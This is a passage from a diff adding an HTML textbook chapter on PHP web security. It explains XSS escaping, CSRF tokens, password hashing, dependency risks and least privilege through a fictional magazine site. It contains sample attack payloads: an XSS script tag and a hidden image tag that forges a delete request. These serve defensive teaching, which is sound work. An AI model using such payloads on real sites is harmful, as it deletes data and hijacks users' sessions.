+<col style="width: 27%">
+<col style="width: 41%">
+<col style="width: 30%">
+</colgroup>
+<thead>
+<tr class="header">
+<th style="text-align: left;">What the attacker writes</th>
+<th style="text-align: left;">The generated HTML</th>
+<th style="text-align: left;">What the <em>browser</em> does</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td style="text-align: left;"><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></td>
+<td style="text-align: left;"><code>&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;</code></td>
+<td style="text-align: left;">shows the text, does not execute it</td>
+</tr>
+</tbody>
+</table>
+</div>
+</figure>
+</div>
+<p>This way, the attacker’s text is shown literally on the page, as visible text, and is not interpreted as code. The rule is to always escape on output: all text coming from users, before displaying it in HTML.</p>
+</section>
+<section id="sec-09-csrf-en" class="level3" data-number="9.3.3">
+<h3 data-number="9.3.3" class="anchored" data-anchor-id="sec-09-csrf-en"><span class="header-section-number">9.3.3</span> CSRF (Cross-Site Request Forgery)</h3>
+<p>CSRF (<em>Cross-Site Request Forgery</em>) is a request that is forged (<em>forgery</em>) from another site (<em>cross-site</em>). It occurs when an attacker tricks the <em>browser</em> of an already-authenticated user into sending, without the user noticing, a request to an application where they have an active session, exploiting the fact that the <em>browser</em> automatically sends session <em>cookies</em> on any request to that domain, as seen in <a href="cap07.html#sec-07-cookies-en" class="quarto-xref"><span>Section 7.9.1</span></a>. The attacked site receives a request that looks like it comes from Rita, but it was the attacker’s page that made it be sent.</p>
+<p>Consider the <code>delete.php</code> of <a href="cap08.html#sec-08-crud-en" class="quarto-xref"><span>Section 8.9</span></a>, in which, to delete a record, it is enough for the <em>browser</em> of Rita (authenticated on the Contraponto site) to request this address:</p>
+<pre><code>GET /delete.php?id=3</code></pre>
+<p>If the attacker’s page has, in its HTML, an “image” that is invisible to Rita (<code>width="0"</code>, <code>height="0"</code>), in which the <code>src</code>, which should be the address of an image, contains the address of <code>delete.php</code>:</p>
+<div class="sourceCode" id="cb10"><pre class="sourceCode numberSource html number-lines code-with-copy"><code class="sourceCode html"><span id="cb10-1"><a href="#cb10-1"></a><span class="dt">&lt;</span><span class="kw">img</span><span class="ot"> src</span><span class="op">=</span><span class="st">"https://contraponto.example/delete.php?id=3"</span><span class="ot"> width</span><span class="op">=</span><span class="st">"0"</span><span class="ot"> height</span><span class="op">=</span><span class="st">"0"</span><span class="dt">&gt;</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p>then, when Rita visits that page, the <em>browser</em> sends the request when loading the “image” and attaches the session <em>cookie</em> by itself: it is a <code>GET</code> that deletes data. <code>delete.php</code> sees a valid session and deletes article 3, without Rita having clicked anything. The attacker never sees the <em>cookie</em> (unlike XSS, in which they steal it): they use Rita’s <em>browser</em> to send the request.</p>
+<p>The defence has two complementary parts. The first is never to change data through <code>GET</code>, as already recommended in <a href="cap07.html#sec-07-get-vs-post-en" class="quarto-xref"><span>Section 7.4.3</span></a> (<code>GET</code> reads, <code>POST</code> changes). The second is to put, in every sensitive form, an unpredictable <em>token</em>, stored in the session and checked before acting. The form generates the <em>token</em> and sends it in a hidden field:</p>
+<div class="sourceCode" id="cb11"><pre class="sourceCode numberSource php number-lines code-with-copy"><code class="sourceCode php"><span id="cb11-1"><a href="#cb11-1"></a><span class="kw">&lt;?php</span></span>
+<span id="cb11-2"><a href="#cb11-2"></a><span class="fu">session_start</span>()<span class="ot">;</span></span>
+<span id="cb11-3"><a href="#cb11-3"></a><span class="cf">if</span> (<span class="kw">empty</span>(<span class="va">$_SESSION</span>[<span class="st">"token"</span>])) {</span>
+<span id="cb11-4"><a href="#cb11-4"></a>    <span class="va">$_SESSION</span>[<span class="st">"token"</span>] <span class="op">=</span> <span class="fu">bin2hex</span>(<span class="fu">random_bytes</span>(<span class="dv">32</span>))<span class="ot">;</span></span>
+<span id="cb11-5"><a href="#cb11-5"></a>}</span>
+<span id="cb11-6"><a href="#cb11-6"></a><span class="kw">?&gt;</span></span>
+<span id="cb11-7"><a href="#cb11-7"></a><span class="op">&lt;</span>form action<span class="op">=</span><span class="st">"delete.php"</span> method<span class="op">=</span><span class="st">"post"</span><span class="op">&gt;</span></span>
+<span id="cb11-8"><a href="#cb11-8"></a>  <span class="op">&lt;</span>input type<span class="op">=</span><span class="st">"hidden"</span> name<span class="op">=</span><span class="st">"id"</span> value<span class="op">=</span><span class="st">"3"</span><span class="op">&gt;</span></span>
+<span id="cb11-9"><a href="#cb11-9"></a>  <span class="op">&lt;</span>input type<span class="op">=</span><span class="st">"hidden"</span> name<span class="op">=</span><span class="st">"token"</span></span>
+<span id="cb11-10"><a href="#cb11-10"></a>         value<span class="op">=</span><span class="st">"&lt;?= </span><span class="va">$_SESSION</span>[<span class="st">"</span>token<span class="st">"] ?&gt;"</span><span class="op">&gt;</span></span>
+<span id="cb11-11"><a href="#cb11-11"></a>  <span class="op">&lt;</span>button<span class="op">&gt;</span>Apagar<span class="op">&lt;/</span>button<span class="op">&gt;</span></span>
+<span id="cb11-12"><a href="#cb11-12"></a><span class="op">&lt;/</span>form<span class="op">&gt;</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p>The <code>random_bytes(32)</code> function generates unpredictable values, <code>bin2hex()</code> converts them to text and <code>hash_equals()</code> compares the two <em>tokens</em>. <code>delete.php</code> rejects the request if the <em>token</em> is missing or does not match:</p>
+<div class="sourceCode" id="cb12"><pre class="sourceCode numberSource php number-lines code-with-copy"><code class="sourceCode php"><span id="cb12-1"><a href="#cb12-1"></a><span class="kw">&lt;?php</span></span>
+<span id="cb12-2"><a href="#cb12-2"></a><span class="fu">session_start</span>()<span class="ot">;</span></span>
+<span id="cb12-3"><a href="#cb12-3"></a><span class="cf">if</span> (<span class="op">!</span><span class="kw">isset</span>(<span class="va">$_SESSION</span>[<span class="st">"token"</span>]<span class="ot">,</span> <span class="va">$_POST</span>[<span class="st">"token"</span>])</span>
+<span id="cb12-4"><a href="#cb12-4"></a>    <span class="op">||</span> <span class="op">!</span><span class="fu">hash_equals</span>(<span class="va">$_SESSION</span>[<span class="st">"token"</span>]<span class="ot">,</span></span>
+<span id="cb12-5"><a href="#cb12-5"></a>                    <span class="va">$_POST</span>[<span class="st">"token"</span>])) {</span>
+<span id="cb12-6"><a href="#cb12-6"></a>    <span class="fu">http_response_code</span>(<span class="dv">403</span>)<span class="ot">;</span></span>
+<span id="cb12-7"><a href="#cb12-7"></a>    <span class="cf">exit</span>(<span class="st">"Pedido inválido."</span>)<span class="ot">;</span></span>
+<span id="cb12-8"><a href="#cb12-8"></a>}</span>
+<span id="cb12-9"><a href="#cb12-9"></a><span class="co">// valid token: delete with a prepared statement</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p>The <code>if</code> reads piece by piece:</p>
+<ol type="1">
+<li><code>!isset($_SESSION["token"], $_POST["token"])</code>: the <code>!</code> means “not”, so the condition is true if either of the two <em>tokens</em> is missing;</li>
+<li><code>||</code> means “or”: it is enough for one of the conditions to be true to reject the request. If the first is true, the second is not even evaluated, which guarantees that <code>hash_equals()</code> never receives a missing value;</li>
+<li><code>!hash_equals(...)</code>: true if the two <em>tokens</em> are different;</li>
+<li><code>{ ... }</code>: replies with the 403 code and <code>exit</code> ends the <em>script</em>.</li>
+</ol>
+<p>The attacker’s page does not know the <em>token</em>: the <em>browser</em> does not let it read the Contraponto page (the <em>same-origin</em> policy), so it cannot include the <em>token</em> in the request.</p>
+</section>
+<section id="sec-09-passwords-en" class="level3" data-number="9.3.4">
+<h3 data-number="9.3.4" class="anchored" data-anchor-id="sec-09-passwords-en"><span class="header-section-number">9.3.4</span> Plain-Text Passwords</h3>
+<p>If passwords are stored exactly as they were typed, this is what the attacker sees if they steal the <code>utilizadores</code> table:</p>
+<div id="tbl-09-plain-text-en" class="quarto-float quarto-figure quarto-figure-center anchored">
+<figure class="quarto-float quarto-float-tbl figure">
+<figcaption class="quarto-float-caption-top quarto-float-caption quarto-float-tbl" id="tbl-09-plain-text-en-caption-0ceaefa1-69ba-4598-a22c-09a6ac19f8ca">
+Table&nbsp;9.3: The <code>utilizadores</code> table with plain-text passwords.
+</figcaption>
+<div aria-describedby="tbl-09-plain-text-en-caption-0ceaefa1-69ba-4598-a22c-09a6ac19f8ca">
+<table class="caption-top table">
+<thead>
+<tr class="header">
+<th style="text-align: center;">id</th>
+<th style="text-align: left;">utilizador</th>
+<th style="text-align: left;">password</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td style="text-align: center;">1</td>
+<td style="text-align: left;">rita</td>
+<td style="text-align: left;">contraponto2026</td>
+</tr>
+<tr class="even">
+<td style="text-align: center;">2</td>
+<td style="text-align: left;">tiago</td>
+<td style="text-align: left;">tiago123</td>
+</tr>
+<tr class="odd">
+<td style="text-align: center;">3</td>
+<td style="text-align: left;">joana</td>
+<td style="text-align: left;">12345678</td>
+</tr>
+</tbody>
+</table>
+</div>
+</figure>
+</div>
+<p>An <em>SQL Injection</em>, a configuration error or a stolen backup expose the whole table. The attacker gets each person’s password, and people reuse passwords on other services. Even whoever administers the site can read the users’ passwords. This is how the <em>login</em> in <a href="#sec-09-sql-injection-en" class="quarto-xref"><span>Section 9.3.1</span></a> compares them, and this is why a password must never be stored: what is stored is a kind of fingerprint of it.</p>
+<section id="sec-09-hash-en" class="level4">
+<h4 class="anchored" data-anchor-id="sec-09-hash-en">The <em>hash</em></h4>
+<p>A <em>hash</em> is the result of a function that turns the password into a fixed-size value. It identifies the password but does not allow it to be reconstructed: the password cannot be recovered from the <em>hash</em>, it can only be guessed, by trial and error. The database stores only the <em>hash</em>, and the real password is never stored. At <em>login</em>, PHP checks whether what the person typed as a password matches the stored <em>hash</em>.</p>
+<p>PHP has two functions for this. At registration, <code>password_hash()</code> creates the <em>hash</em>, and at login, <code>password_verify()</code> checks it:</p>
+<div class="sourceCode" id="cb13"><pre class="sourceCode numberSource php number-lines code-with-copy"><code class="sourceCode php"><span id="cb13-1"><a href="#cb13-1"></a><span class="kw">&lt;?php</span></span>
+<span id="cb13-2"><a href="#cb13-2"></a><span class="va">$hash</span> <span class="op">=</span> <span class="fu">password_hash</span>(</span>
+<span id="cb13-3"><a href="#cb13-3"></a>    <span class="va">$_POST</span>[<span class="st">"password"</span>]<span class="ot">,</span> <span class="cn">PASSWORD_DEFAULT</span></span>
+<span id="cb13-4"><a href="#cb13-4"></a>)<span class="ot">;</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<div class="sourceCode" id="cb14"><pre class="sourceCode numberSource php number-lines code-with-copy"><code class="sourceCode php"><span id="cb14-1"><a href="#cb14-1"></a><span class="kw">&lt;?php</span></span>
+<span id="cb14-2"><a href="#cb14-2"></a><span class="co">// $hash comes from the database</span></span>
+<span id="cb14-3"><a href="#cb14-3"></a><span class="cf">if</span> (<span class="fu">password_verify</span>(</span>
+<span id="cb14-4"><a href="#cb14-4"></a>        <span class="va">$_POST</span>[<span class="st">"password"</span>]<span class="ot">,</span> <span class="va">$hash</span>)) {</span>
+<span id="cb14-5"><a href="#cb14-5"></a>    <span class="co">// correct password</span></span>
+<span id="cb14-6"><a href="#cb14-6"></a>}</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p>Two runs of <code>password_hash()</code> with the same password give different results, for example:</p>
+<pre><code>$2y$12$BpqtsRr5RdRVkRxTwYNZr.xd21tabzoCdzCgglor5pk9Ilryp9Xt2
+$2y$12$JN664fXU3AqFVrjy2BYRruHKFpVmDZnHpk4rHlZTo5mSHGVvCrjnC</code></pre>
+<p>This is normal. PHP adds a random value, the <em>salt</em>, to the password before calculating, and the same text never gives the same <em>hash</em>: two people with the same password end up with different <em>hashes</em>. <code>password_verify()</code> reads the <em>salt</em> inside the stored <em>hash</em> and repeats the calculation.</p>
+<p>Each <em>hash</em> takes up 60 characters and already includes the algorithm and the <em>salt</em>. The <code>PASSWORD_DEFAULT</code> constant picks the recommended algorithm (today, <em>bcrypt</em>) and may change, which is why the <code>password</code> column becomes <code>VARCHAR(255)</code>. A weak password, such as <code>12345678</code>, will still be discovered: the <em>hash</em> protects the table, not poor choices.</p>
+</section>
+<section id="sec-09-register-login-en" class="level4">
+<h4 class="anchored" data-anchor-id="sec-09-register-login-en">Registration and <em>login</em></h4>
+<p><code>registo.php</code> stores only the <em>hash</em>, and <code>login.php</code> searches only by user:</p>
+<div class="sourceCode" id="cb16"><pre class="sourceCode numberSource php number-lines code-with-copy"><code class="sourceCode php"><span id="cb16-1"><a href="#cb16-1"></a><span class="kw">&lt;?php</span></span>
+<span id="cb16-2"><a href="#cb16-2"></a><span class="kw">require</span> <span class="st">"config.php"</span><span class="ot">;</span></span>
+<span id="cb16-3"><a href="#cb16-3"></a><span class="va">$utilizador</span> <span class="op">=</span> <span class="va">$_POST</span>[<span class="st">"utilizador"</span>]<span class="ot">;</span></span>
+<span id="cb16-4"><a href="#cb16-4"></a><span class="va">$hash</span> <span class="op">=</span> <span class="fu">password_hash</span>(<span class="va">$_POST</span>[<span class="st">"password"</span>]<span class="ot">,</span></span>
+<span id="cb16-5"><a href="#cb16-5"></a>                      <span class="cn">PASSWORD_DEFAULT</span>)<span class="ot">;</span></span>
+<span id="cb16-6"><a href="#cb16-6"></a><span class="va">$stmt</span> <span class="op">=</span> <span class="va">$conexao</span>-&gt;prepare(</span>
+<span id="cb16-7"><a href="#cb16-7"></a>    <span class="st">"INSERT INTO utilizadores</span></span>
+<span id="cb16-8"><a href="#cb16-8"></a><span class="st">     (utilizador, password) VALUES (?, ?)"</span></span>
+<span id="cb16-9"><a href="#cb16-9"></a>)<span class="ot">;</span></span>
+<span id="cb16-10"><a href="#cb16-10"></a><span class="va">$stmt</span>-&gt;bind_param(<span class="st">"ss"</span><span class="ot">,</span> <span class="va">$utilizador</span><span class="ot">,</span> <span class="va">$hash</span>)<span class="ot">;</span></span>
+<span id="cb16-11"><a href="#cb16-11"></a><span class="va">$stmt</span>-&gt;execute()<span class="ot">;</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<div class="sourceCode" id="cb17"><pre class="sourceCode numberSource php number-lines code-with-copy"><code class="sourceCode php"><span id="cb17-1"><a href="#cb17-1"></a><span class="kw">&lt;?php</span></span>
+<span id="cb17-2"><a href="#cb17-2"></a><span class="kw">require</span> <span class="st">"config.php"</span><span class="ot">;</span></span>
+<span id="cb17-3"><a href="#cb17-3"></a><span class="va">$stmt</span> <span class="op">=</span> <span class="va">$conexao</span>-&gt;prepare(</span>
+<span id="cb17-4"><a href="#cb17-4"></a>    <span class="st">"SELECT password FROM utilizadores</span></span>
+<span id="cb17-5"><a href="#cb17-5"></a><span class="st">     WHERE utilizador = ?"</span></span>
+<span id="cb17-6"><a href="#cb17-6"></a>)<span class="ot">;</span></span>
+<span id="cb17-7"><a href="#cb17-7"></a><span class="va">$stmt</span>-&gt;bind_param(<span class="st">"s"</span><span class="ot">,</span> <span class="va">$_POST</span>[<span class="st">"utilizador"</span>])<span class="ot">;</span></span>
+<span id="cb17-8"><a href="#cb17-8"></a><span class="va">$stmt</span>-&gt;execute()<span class="ot">;</span></span>
+<span id="cb17-9"><a href="#cb17-9"></a><span class="va">$resultado</span> <span class="op">=</span> <span class="va">$stmt</span>-&gt;get_result()<span class="ot">;</span></span>
+<span id="cb17-10"><a href="#cb17-10"></a><span class="va">$linha</span> <span class="op">=</span> <span class="va">$resultado</span>-&gt;fetch_assoc()<span class="ot">;</span></span>
+<span id="cb17-11"><a href="#cb17-11"></a><span class="cf">if</span> (<span class="va">$linha</span> <span class="op">&amp;&amp;</span> <span class="fu">password_verify</span>(<span class="va">$_POST</span>[<span class="st">"password"</span>]<span class="ot">,</span></span>
+<span id="cb17-12"><a href="#cb17-12"></a>                              <span class="va">$linha</span>[<span class="st">"password"</span>])) {</span>
+<span id="cb17-13"><a href="#cb17-13"></a>    <span class="fu">session_start</span>()<span class="ot">;</span></span>
+<span id="cb17-14"><a href="#cb17-14"></a>    <span class="va">$_SESSION</span>[<span class="st">"utilizador"</span>] <span class="op">=</span> <span class="va">$_POST</span>[<span class="st">"utilizador"</span>]<span class="ot">;</span></span>
+<span id="cb17-15"><a href="#cb17-15"></a>    <span class="fu">header</span>(<span class="st">"Location: painel.php"</span>)<span class="ot">;</span></span>
+<span id="cb17-16"><a href="#cb17-16"></a>} <span class="cf">else</span> {</span>
+<span id="cb17-17"><a href="#cb17-17"></a>    <span class="kw">echo</span> <span class="st">"Utilizador ou palavra-passe inválidos."</span><span class="ot">;</span></span>
+<span id="cb17-18"><a href="#cb17-18"></a>}</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p>This <em>login</em> differs from the one in the <em>SQL Injection</em> section in four ways:</p>
+<ol type="1">
+<li>Registration stores only the <em>hash</em>;</li>
+<li>The <em>login</em> searches only by user: the password never enters the SQL;</li>
+<li>If the user does not exist, the <code>$linha &amp;&amp;</code> avoids checking the password;</li>
+<li>The error message does not say whether the user or the password failed, so as not to reveal to an attacker that a given username exists.</li>
+</ol>
+</section>
+</section>
+</section>
+<section id="sec-09-dependencies-en" class="level2" data-number="9.4">
+<h2 data-number="9.4" class="anchored" data-anchor-id="sec-09-dependencies-en"><span class="header-section-number">9.4</span> Vulnerabilities in Third-Party Dependencies</h2>
+<p>The attack surface of a website is not limited to the code written directly by its programmer. Much of today’s Web is built on content management systems, such as <code>WordPress</code>, extended through third-party <em>plugins</em>, often developed by very small teams or even a single independent programmer. According to Patchstack’s report <em>State of WordPress Security in 2026</em>, 91% of the new vulnerabilities in the WordPress ecosystem in 2025 were in <em>plugins</em> and 9% in themes; the WordPress core had only 6, out of more than 11,000 (11,334), all of them low priority <span class="citation" data-cites="patchstack_2026_report">(<a href="cap01.html#ref-patchstack_2026_report" role="doc-biblioref">Patchstack 2026</a>)</span>.</p>
+<p>This reality led the most recent update of the OWASP Top 10 to keep a category dedicated to failures in the software supply chain (<em>Software Supply Chain Failures</em>, A03), recognising that an application’s security also depends on the security of every library, <em>framework</em> and extension it relies on, not just the code written by the team itself <span class="citation" data-cites="owasp_top10_2025">(<a href="cap01.html#ref-owasp_top10_2025" role="doc-biblioref">OWASP Foundation 2026</a>)</span>. A library may, moreover, depend on another vulnerable one (transitive dependencies): this is the case of Log4Shell (2021), a flaw in a <em>logging</em> library present in thousands of applications. The flaw may be in code that the site’s owner never wrote, but the risk it represents is just as real.</p>
+<p>In the case of Contraponto, the site does not use third-party libraries, but it runs on third-party <em>software</em>, the web server and MySQL, which also have flaws.</p>
+</section>
+<section id="sec-09-best-practices-en" class="level2" data-number="9.5">
+<h2 data-number="9.5" class="anchored" data-anchor-id="sec-09-best-practices-en"><span class="header-section-number">9.5</span> Best Practices</h2>
+<p>A few simple practices significantly reduce the security risk of a web application.</p>
+<section id="sec-09-updates-en" class="level3" data-number="9.5.1">
+<h3 data-number="9.5.1" class="anchored" data-anchor-id="sec-09-updates-en"><span class="header-section-number">9.5.1</span> Regular updates</h3>
+<p>Many flaws are only exploited after they become public, and the interval between disclosure and exploitation can be very short. PHP, the web server and MySQL should be kept up to date (old versions stop receiving fixes, and their flaws become public and documented), as should <em>plugins</em> and themes, installing only the necessary ones, from trustworthy sources, and removing those that are no longer used. Checking the version is the first step to knowing whether there are fixes to apply:</p>
+<div class="sourceCode" id="cb18"><pre class="sourceCode numberSource bash number-lines code-with-copy"><code class="sourceCode bash"><span id="cb18-1"><a href="#cb18-1"></a><span class="ex">php</span> <span class="at">-v</span>           <span class="co"># PHP version</span></span>
+<span id="cb18-2"><a href="#cb18-2"></a><span class="ex">mysql</span> <span class="at">--version</span>  <span class="co"># MySQL version</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p>Updating is not just running a command: it is advisable to test first and have a backup, because an update can also fail.</p>
+</section>
+<section id="sec-09-least-privilege-en" class="level3" data-number="9.5.2">
+<h3 data-number="9.5.2" class="anchored" data-anchor-id="sec-09-least-privilege-en"><span class="header-section-number">9.5.2</span> Principle of least privilege</h3>
+<p>Every component of an application, and every database user, should have only the permissions it needs, never full access for convenience. With the SQL permission-control commands (<a href="cap08.html#sec-08-sql-en" class="quarto-xref"><span>Section 8.2</span></a>), a user is created just for the application:</p>
+<div class="sourceCode" id="cb19"><pre class="sourceCode numberSource sql number-lines code-with-copy"><code class="sourceCode sql"><span id="cb19-1"><a href="#cb19-1"></a><span class="co">-- creates the user that the application uses</span></span>
+<span id="cb19-2"><a href="#cb19-2"></a><span class="kw">CREATE</span> <span class="fu">USER</span> <span class="st">'contraponto_app'</span>@<span class="st">'localhost'</span></span>
+<span id="cb19-3"><a href="#cb19-3"></a>    <span class="kw">IDENTIFIED</span> <span class="kw">BY</span> <span class="st">'palavra-passe-forte'</span>;</span>
+<span id="cb19-4"><a href="#cb19-4"></a></span>
+<span id="cb19-5"><a href="#cb19-5"></a><span class="co">-- only these operations, only on this database</span></span>
+<span id="cb19-6"><a href="#cb19-6"></a><span class="kw">GRANT</span> <span class="kw">SELECT</span>, <span class="kw">INSERT</span>, <span class="kw">UPDATE</span>, <span class="kw">DELETE</span></span>
+<span id="cb19-7"><a href="#cb19-7"></a>    <span class="kw">ON</span> contraponto.<span class="op">*</span> <span class="kw">TO</span> <span class="st">'contraponto_app'</span>@<span class="st">'localhost'</span>;</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p>This account cannot drop tables, change the structure (<code>DROP</code>, <code>ALTER</code>, <code>CREATE</code>) or access other databases. It can still read and change the Contraponto data, however: least privilege limits the damage, it does not prevent the attack. Using the <code>root</code> user in a web application is a serious bad practice: with an <em>SQL Injection</em>, the attacker would have full access to the database server. The same principle applies to files: the web server should only be able to write to the folders it needs (for example, the one for uploaded files), never to the PHP code.</p>
+</section>
+<section id="sec-09-validate-escape-en" class="level3" data-number="9.5.3">
+<h3 data-number="9.5.3" class="anchored" data-anchor-id="sec-09-validate-escape-en"><span class="header-section-number">9.5.3</span> Validate and escape data</h3>
+<p>All data coming from outside (<code>$_GET</code>, <code>$_POST</code>, <code>$_COOKIE</code>, HTTP headers) is treated as untrusted. Validation checks whether the data has the expected format, such as a non-empty text, a number or a date:</p>
+<div class="sourceCode" id="cb20"><pre class="sourceCode numberSource php number-lines code-with-copy"><code class="sourceCode php"><span id="cb20-1"><a href="#cb20-1"></a><span class="kw">&lt;?php</span></span>
+<span id="cb20-2"><a href="#cb20-2"></a><span class="cf">if</span> (<span class="op">!</span><span class="kw">isset</span>(<span class="va">$_POST</span>[<span class="st">"comentario"</span>])</span>
+<span id="cb20-3"><a href="#cb20-3"></a>    <span class="op">||</span> <span class="va">$_POST</span>[<span class="st">"comentario"</span>] <span class="op">===</span> <span class="st">""</span>) {</span>
+<span id="cb20-4"><a href="#cb20-4"></a>    <span class="cf">exit</span>(<span class="st">"Escreve um comentário."</span>)<span class="ot">;</span></span>
+<span id="cb20-5"><a href="#cb20-5"></a>}</span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p>Escaping makes the data safe for the context in which it will be used:</p>
+<div id="tbl-09-contexts-en" class="quarto-float quarto-figure quarto-figure-center anchored">
+<figure class="quarto-float quarto-float-tbl figure">
+<figcaption class="quarto-float-caption-top quarto-float-caption quarto-float-tbl" id="tbl-09-contexts-en-caption-0ceaefa1-69ba-4598-a22c-09a6ac19f8ca">
+Table&nbsp;9.4: Escaping according to context.
+</figcaption>
+<div aria-describedby="tbl-09-contexts-en-caption-0ceaefa1-69ba-4598-a22c-09a6ac19f8ca">
+<table class="caption-top table">
+<thead>
+<tr class="header">
+<th style="text-align: left;">Context</th>
+<th style="text-align: left;">How to handle it</th>
+<th style="text-align: left;">Prevents</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td style="text-align: left;">HTML</td>
+<td style="text-align: left;"><code>htmlspecialchars()</code></td>
+<td style="text-align: left;">XSS</td>
+</tr>
+<tr class="even">
+<td style="text-align: left;">SQL</td>
+<td style="text-align: left;"><em>prepared statements</em></td>
+<td style="text-align: left;"><em>SQL Injection</em></td>
+</tr>
+</tbody>
+</table>
+</div>
+</figure>
+</div>
+<p>Validating does not replace escaping: a non-empty comment passes validation and may contain <code>&lt;script&gt;</code>. And validation done in the <em>browser</em> does not protect, because an attacker sends the request without going through the form.</p>
+</section>
+<section id="sec-09-errors-production-en" class="level3" data-number="9.5.4">
+<h3 data-number="9.5.4" class="anchored" data-anchor-id="sec-09-errors-production-en"><span class="header-section-number">9.5.4</span> Do not show errors in production</h3>
+<p>During development, <code>display_errors</code> helps find out what is failing (<a href="cap08.html#sec-08-errors-en" class="quarto-xref"><span>Section 8.8</span></a>). On a production site, the same message helps the attacker: it reveals names of tables, files and users. The development configuration shows errors on screen; the production one logs them without showing them:</p>
+<div class="sourceCode" id="cb21"><pre class="sourceCode numberSource php number-lines code-with-copy"><code class="sourceCode php"><span id="cb21-1"><a href="#cb21-1"></a><span class="kw">&lt;?php</span></span>
+<span id="cb21-2"><a href="#cb21-2"></a><span class="co">// development</span></span>
+<span id="cb21-3"><a href="#cb21-3"></a><span class="fu">error_reporting</span>(<span class="cn">E_ALL</span>)<span class="ot">;</span></span>
+<span id="cb21-4"><a href="#cb21-4"></a><span class="fu">ini_set</span>(<span class="st">"display_errors"</span><span class="ot">,</span> <span class="dv">1</span>)<span class="ot">;</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<div class="sourceCode" id="cb22"><pre class="sourceCode numberSource php number-lines code-with-copy"><code class="sourceCode php"><span id="cb22-1"><a href="#cb22-1"></a><span class="kw">&lt;?php</span></span>
+<span id="cb22-2"><a href="#cb22-2"></a><span class="co">// production</span></span>
+<span id="cb22-3"><a href="#cb22-3"></a><span class="fu">error_reporting</span>(<span class="cn">E_ALL</span>)<span class="ot">;</span></span>
+<span id="cb22-4"><a href="#cb22-4"></a><span class="fu">ini_set</span>(<span class="st">"display_errors"</span><span class="ot">,</span> <span class="dv">0</span>)<span class="ot">;</span></span>
+<span id="cb22-5"><a href="#cb22-5"></a><span class="fu">ini_set</span>(<span class="st">"log_errors"</span><span class="ot">,</span> <span class="dv">1</span>)<span class="ot">;</span></span></code><button title="Copy to Clipboard" class="code-copy-button"><i class="bi"></i></button></pre></div>
+<p>A visitor could read, for example, <code>Access denied for user 'utilizador'@'localhost'</code>, which reveals the name of the database user, or <code>You have an error in your SQL syntax</code>, which confirms that their input reached the query (<em>SQL Injection</em>). In production, errors are still all logged, but they go to the server’s error log, which only the team reads. In practice, these options are set in <code>php.ini</code>, the PHP configuration on the server, and not on each page.</p>
+</section>
+</section>
+<section id="sec-09-challenge-en" class="level2" data-number="9.6">
+<h2 data-number="9.6" class="anchored" data-anchor-id="sec-09-challenge-en"><span class="header-section-number">9.6</span> Challenge: Find the Flaws</h2>
+<p>Tiago is going to implement the Contraponto administration panel. Each of Rita’s requirements translates into threats and defences from this chapter:</p>
+<div id="tbl-09-requirements-en" class="quarto-float quarto-figure quarto-figure-center anchored">
+<figure class="quarto-float quarto-float-tbl figure">
+<figcaption class="quarto-float-caption-top quarto-float-caption quarto-float-tbl" id="tbl-09-requirements-en-caption-0ceaefa1-69ba-4598-a22c-09a6ac19f8ca">
+Table&nbsp;9.5: Rita’s requirements.
+</figcaption>
+<div aria-describedby="tbl-09-requirements-en-caption-0ceaefa1-69ba-4598-a22c-09a6ac19f8ca">
+<table class="caption-top table">
+<colgroup>
+<col style="width: 32%">
+<col style="width: 32%">
+<col style="width: 34%">
+</colgroup>
+<thead>
+<tr class="header">
+<th style="text-align: left;">Rita’s requirement</th>
+<th style="text-align: left;">Threat</th>
+<th style="text-align: left;">Defence</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td style="text-align: left;">Only Rita manages the articles</td>
+<td style="text-align: left;">Requests without checking the session; CSRF</td>
+<td style="text-align: left;">Check the session (<a href="cap07.html#sec-07-sessions-en" class="quarto-xref"><span>Section 7.9.2</span></a>); POST and CSRF <em>token</em></td>
+</tr>
+<tr class="even">
+<td style="text-align: left;">Comments cannot be used for attacks</td>
+<td style="text-align: left;">XSS</td>
+<td style="text-align: left;"><code>htmlspecialchars()</code> on all displayed text</td>
+</tr>
+<tr class="odd">
+<td style="text-align: left;">Secure accounts and passwords</td>
+<td style="text-align: left;">Stolen table; guessed passwords</td>
+<td style="text-align: left;"><code>password_hash()</code> and <code>password_verify()</code></td>
+</tr>
+<tr class="even">
+<td style="text-align: left;">The magazine’s data is protected</td>
+<td style="text-align: left;"><em>SQL Injection</em>; account with too many permissions</td>
+<td style="text-align: left;"><em>Prepared statements</em>; least privilege</td>
+</tr>
+<tr class="odd">
+<td style="text-align: left;">The site stays secure over time</td>
+<td style="text-align: left;">Flaws in third-party <em>software</em>; visible errors</td>
+<td style="text-align: left;">Update everything; errors only in the log</td>
+</tr>
+</tbody>
+</table>
+</div>
+</figure>
+</div>
+<p>Tiago wrote the first version of two files. There are six flaws from this chapter: the challenge is to find and fix them.</p>
+<div class="sourceCode" id="cb23"><pre class="sourceCode numberSource php number-lines code-with-copy"><code class="sourceCode php"><span id="cb23-1"><a href="#cb23-1"></a><span class="kw">&lt;?php</span></span>
+<span id="cb23-2"><a href="#cb23-2"></a><span class="co">// login.php</span></span>
+<span id="cb23-3"><a href="#cb23-3"></a><span class="kw">require</span> <span class="st">"config.php"</span><span class="ot">;</span></span>
